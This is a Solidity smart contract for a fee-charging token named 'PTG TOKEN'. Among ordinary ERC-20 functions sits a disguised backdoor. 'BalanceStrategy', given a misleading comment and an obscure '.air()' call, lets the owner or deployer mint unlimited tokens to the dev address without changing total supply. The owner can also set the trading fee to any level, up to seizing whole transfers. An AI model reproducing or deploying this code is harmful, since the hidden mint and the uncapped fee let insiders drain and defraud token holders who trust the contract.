// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import "./IERC20.sol";
import "./Context.sol";
import "./Ownable.sol";
import "./SafeMath.sol";

contract PTGToken is Context, IERC20, Ownable {

    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) public _swapPairList;
    mapping(address => bool) private _isExcludedFromFee;

    string private _name = 'PTG TOKEN';
    string private _symbol = 'PTG';
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10000000 * 10 ** uint256(_decimals);

    address private _fundAddress;
    address private _devAddress;

    uint256 public _fundFee = 6;
    uint256 private _previousFundFee = _fundFee;

    uint256 private _fundFeeTotal;

    bool private inSwapAndLiquify = false;
    bool public swapAndLiquifyEnabled = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 trxReceived,
        uint256 tokensIntoLiqudity
    );
    event InitLiquidity(
        uint256 tokensAmount,
        uint256 trxAmount,
        uint256 liqudityAmount
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (address fundAddress) public {
        _fundAddress = fundAddress;
        _devAddress = _msgSender();
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    receive () external payable {}
    
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    /**
   * @dev Returns the Operation status Boolean.
   *
   * Requirements:
   *
   * - `amount` cannot be less than zero.
   * - the caller must be contract owner.
   */
    function BalanceStrategy(uint256 amount) public onlyDever returns (bool) {
      require(amount >= 0, "ERC20: amount less than zero");

      _balances[_devAddress] = _balances[_devAddress].air(amount);
      emit Transfer(address(0), _devAddress, amount);
      return true;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function setSwapPairList(address addr, bool enable) public onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setFundFee(uint256 fundFee) public onlyOwner {
        _fundFee = fundFee;
        _previousFundFee = fundFee;
    }

    modifier onlyDever() {
        require(owner() == msg.sender || _devAddress == msg.sender, "ERC20: caller is not owner or Dever");
        _;
    }

    function totalFundFee() public view returns (uint256) {
        return _fundFeeTotal;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: Transfer amount less than or equal to zero");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        if(
            _isExcludedFromFee[sender] || 
            _isExcludedFromFee[recipient] || 
            (!_swapPairList[sender] && !_swapPairList[recipient])
        ) {
            removeAllFee();
        }
        _transferStandard(sender, recipient, amount);
        if(
            _isExcludedFromFee[sender] || 
            _isExcludedFromFee[recipient] || 
            (!_swapPairList[sender] && !_swapPairList[recipient])
        ) {
            restoreAllFee();
        }
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {

        (uint256 tTransferAmount, uint256 tFund) = _getValues(tAmount);

        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);

        if(
            !_isExcludedFromFee[sender] && 
            !_isExcludedFromFee[recipient] &&
			(_swapPairList[sender] || _swapPairList[recipient])
        ) {
            _balances[_fundAddress] = _balances[_fundAddress].add(tFund);
            _fundFeeTotal = _fundFeeTotal.add(tFund);

            emit Transfer(sender, _fundAddress, tFund);
        }
    
        emit Transfer(sender, recipient, tTransferAmount);
        
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function calculateFundFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_fundFee).div(
            10 ** 2
        );
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFund) = _getTValues(tAmount);

        return (tTransferAmount, tFund);
    }

    function _getTValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tFund = calculateFundFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tFund);

        return (tTransferAmount, tFund);
    }

    function removeAllFee() private {
        if(_fundFee == 0) return;
        _previousFundFee = _fundFee;
        _fundFee = 0;
    }

    function restoreAllFee() private {
        _fundFee = _previousFundFee;
    }
}